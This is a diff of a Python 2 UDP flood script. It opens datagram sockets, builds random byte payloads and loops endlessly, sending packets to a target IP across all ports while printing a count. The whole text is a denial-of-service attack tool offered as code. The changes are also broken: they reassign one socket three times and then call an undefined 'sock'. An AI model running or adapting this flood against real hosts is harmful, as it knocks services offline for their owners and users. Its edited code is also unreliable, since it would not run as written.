@@ -9,13 +9,13 @@ C = '\033[36m'
 W = '\033[0m'
 
 sock0 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-sock1 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-sock2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-sock3 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+sock0 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+sock0 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+sock0 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
-bytes = random._urandom(100)
-bytes1 = random._urandom(1500)
-bytes2 = random._urandom(750)
+
+bytes = random._urandom(50)
+bytes1 = random._urandom(25)
 
 try:
    os.system("clear")
@@ -30,28 +30,28 @@ sent = 0
 speedsent = 0
 try:
    while True:
-        sock0.sendto(bytes2, (ip,port))
+        sock.sendto(bytes, (ip,port))
         sent = sent + 1
         port = port + 1
         print "Sending %s packet to %s throught port:%s"%(sent,ip,port)
         if port == 65534:
           port = 1
         while True:
-             sock1.sendto(bytes1, (ip,port))
+             sock.sendto(bytes, (ip,port))
              sent = sent + 1
              port = port + 1
              print "Sending %s packet to %s throught port:%s"%(sent,ip,port)
              if port == 65534:
                port = 1
              while True:
-                  sock2.sendto(bytes, (ip,port))
+                  sock.sendto(bytes1, (ip,port))
                   sent = sent + 1
                   port = port + 1
                   print "Sending %s packet to %s throught port:%s"%(sent,ip,port)
                   if port == 65534:
                     port = 1
                   while True:
-                       sock3.sendto(bytes, (ip,port))
+                       sock.sendto(bytes1, (ip,port))
                        sent = sent + 1
                        port = port + 1
                        print "Sending %s packet to %s throught port:%s"%(sent,ip,port)
